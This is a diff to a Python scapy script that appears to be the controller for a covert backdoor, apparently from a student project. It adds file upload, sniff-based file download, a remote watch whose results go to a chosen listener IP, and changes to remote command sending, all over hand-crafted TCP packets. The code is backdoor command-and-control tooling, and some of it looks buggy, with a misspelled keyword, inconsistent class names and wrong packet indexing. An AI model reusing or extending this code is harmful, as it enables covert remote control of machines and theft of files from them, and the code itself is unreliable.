@@ -15,6 +15,7 @@
 ---------------------------------------------------------------------------------------------
 '''
 from scapy.all import *
+from encrypt import *
 import os
 import random
 
@@ -244,7 +245,9 @@ def sendCommand(address, port):
 		elif choice == 'I' or choice == 'i':
 			print "Input file or directory to be watched: "
 			notice = raw_input()
-			notify(address, port, notice)
+			print "Input IP address of listening server which should receive iNotify results: "
+			listener = raw_input()
+			notify(address, port, notice, listener)
 			return
 		elif choice == 'K' or choice == 'k':
 			print "Terminating Server..."
@@ -290,8 +293,19 @@ def sendFile(address, port, sFile):
 	print "Do stuff"
 	commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
 	                TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215))/\
-	                raw(LOAD=encrypt(sFile))
+	                RAW(LOAD=encrypt(sFile))
 	send(commandPacket, verose=0)
+	with open(sFile, "r") as tFile:
+		for line in tFile:
+			commandPacket[IP].id = commandPacket[IP].id + 1
+			commandPacket[TCP].seq = commandPacket[TCP].seq + 1
+			commandPacket[RAW].load = encrypt(line)
+			send(commandPacket, verbose=0)
+	commandPacket[IP].id = commandPacket[IP].id + 1
+	commandPacket[TCP].seq = commandPacket[TCP].seq + 1
+	commandPacket[RAW].load = ""
+	commandPacket[TCP].flags="F"
+	send(commandPacket, verbose=0)
 
 '''
 ---------------------------------------------------------------------------------------------
@@ -321,6 +335,14 @@ def getFile(address, port, gFile):
 	                RAW(load=encrypt(gFile))
 	send(commandPacket, verose=0)
 
+	with open(gFile, "w") as tFile:
+		while True:
+			dPacket = sniff(filter="tcp sport " + str(port) + " and ip src " + address, count=1, timeout=30)
+			if len(dPacket) == 0:
+				break
+			tFile.write(dPacket[RAW].load)
+			if "F" in dPacket[0][TCP].flags:
+				break
 '''
 ---------------------------------------------------------------------------------------------
 -- 
@@ -366,10 +388,11 @@ def terminal(address, port, command):
 -- 
 -- PROGRAMMER: John Payment
 -- 
--- INTERFACE: notify(address, port, notice)
+-- INTERFACE: notify(address, port, notice, listener)
 --              address - The address of the server
 --              port - The port to which packets should be sent
 --              notice - The file or directory which should be monitored
+--              listener - Address of the listening server
 -- 
 -- RETURNS: N/A
 -- 
@@ -377,11 +400,11 @@ def terminal(address, port, command):
 -- 
 ---------------------------------------------------------------------------------------------
 '''
-def notify(address, port, notice):
+def notify(address, port, notice, listener):
 	print "Do stuff"
 	commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
 	                TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215), flags="AS")/\
-	                RAW(load=encrypt(notice))
+	                RAW(load=encrypt(notice + "\n" + listener))
 	send(commandPacket, verose=0)
 
 '''
@@ -409,29 +432,6 @@ def kill(address, port):
 	commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
 	                TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215), flags="F")
 	send(commandPacket, verose=0)
-
-'''
----------------------------------------------------------------------------------------------
--- 
--- FUNCTION: encrypt
--- 
--- DATE: 2014-11-14
--- 
--- DESIGNERS: John Payment
--- 
--- PROGRAMMER: John Payment
--- 
--- INTERFACE: encrypt(message)
---              message - The message to be encrypted or decryped
--- 
--- RETURNS: N/A
--- 
--- NOTES: 
--- 
----------------------------------------------------------------------------------------------
-'''
-def encrypt(message):
-	return message
 
 main()
 
